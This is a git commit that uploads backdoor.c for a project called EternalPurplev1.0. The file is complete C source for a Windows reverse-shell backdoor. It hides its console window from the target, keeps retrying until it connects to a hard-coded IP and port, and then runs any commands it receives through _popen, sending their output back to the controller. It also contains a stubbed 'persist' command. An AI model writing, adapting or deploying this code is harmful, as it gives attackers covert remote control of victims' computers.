8020d3dae28e68482ab42eee0230579cf9c41142
PolGs <polgalvezsoriano@gmail.com>
2021-07-18 06:30:49 +0200

    Add files via upload

---
+++ EternalPurplev1.0/backdoor.c
@@ -0,0 +1,120 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <winsock2.h>
+#include <windows.h>
+#include <wininet.h>
+#include <winuser.h>
+#include <windowsx.h>
+#include <string.h>
+#include <sys/stat.h>
+#include <sys/types.h>
+
+#define bzero(p, size) (void) memset ((p), 0, (size))
+
+int sock;
+
+//STRCUT used for cd command
+char *
+str_cut(char str[], int slice_from, int slice_to){
+	if (str[0] == '\0') return NULL;
+	char *buffer;
+	size_t str_len, buffer_len;
+
+	if(slice_to < 0 && slice_from > slice_to){
+		str_len = strlen(str);
+		if (abs(slice_to) > str_len - 1)
+			return NULL;
+
+		if (abs(slice_from) > str_len)
+			slice_from = (-1) * str_len;
+
+		buffer_len = slice_to - slice_from;
+		str += (str_len + slice_from);
+
+	}else if (slice_from >= 0 && slice_to > slice_from){
+		str_len = strlen(str);
+
+		if (slice_from > str_len - 1)
+			return NULL;
+
+		buffer_len = slice_to - slice_from;
+		str += slice_from;
+	} else
+		return NULL;
+
+	buffer = calloc(buffer_len, sizeof(char));
+	strncpy(buffer, str, buffer_len);
+	return buffer;
+}
+
+
+
+
+
+
+void Shell(){ //Once connected execute custom commands or bash
+	char buffer[1024];
+	char container[1024];
+	char total_response[18384];
+	
+	while (1) {
+ 		 jump:
+		 bzero(buffer,1024);
+		 bzero(container, sizeof(container));
+		 bzero(total_response, sizeof(total_response));
+		 recv(sock, buffer, 1024, 0);
+		//-----ETERNALPURPLE-COMMANDS------
+		if (strncmp("q", buffer, 1) == 0) {//Use "q" to quit
+			 closesocket(sock);
+			 WSACleanup();
+			 exit(0);
+    		}
+		else if(strncmp("cd ",buffer,3) == 0){//Use cd to change directory
+			chdir(str_cut(buffer,3,100));
+		}
+		else if(strncmp("persist", buffer, 7) == 0){//Use "persist" to try enable boot run
+			//bootRun();
+		}
+    		else {					//Else send raw data
+			FILE *fp;
+			fp = _popen(buffer, "r");
+			while(fgets(container,1024,fp) != NULL) {
+				strcat(total_response, container);
+        	}
+		send(sock, total_response, sizeof(total_response), 0);
+		fclose(fp);
+    		}
+	}
+}
+
+int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow){
+	//1) HIDE PROCESS FROM TARGET
+	HWND stealth;
+	AllocConsole();
+	stealth = FindWindow("ConsoleWindowClass", NULL);
+	ShowWindow(stealth, 0);
+	//2) DEFINE NETWORKNG STUFF NEEDED (PORT & IP)
+	struct sockaddr_in ServAddr;
+	unsigned short ServPort;
+	char *ServIP;
+	WSADATA wsaData;
+	ServIP = "192.168.1.171";//Server IP
+	ServPort = 50005;//Server Port
+	if(WSAStartup(MAKEWORD(2,0), &wsaData) != 0){
+		exit(1);//Error control
+	}
+	sock = socket(AF_INET, SOCK_STREAM, 0);
+	memset(&ServAddr, 0, sizeof(ServAddr));
+	ServAddr.sin_family = AF_INET;
+	ServAddr.sin_addr.s_addr = inet_addr(ServIP);
+	ServAddr.sin_port = htons(ServPort);
+	//3) TRY TO CONNECT
+	start:
+	while( connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr)) != 0){
+		Sleep(10);
+		goto start;
+	}
+	//4) EXECUTE SHELL COMMANDS
+	Shell();
+}
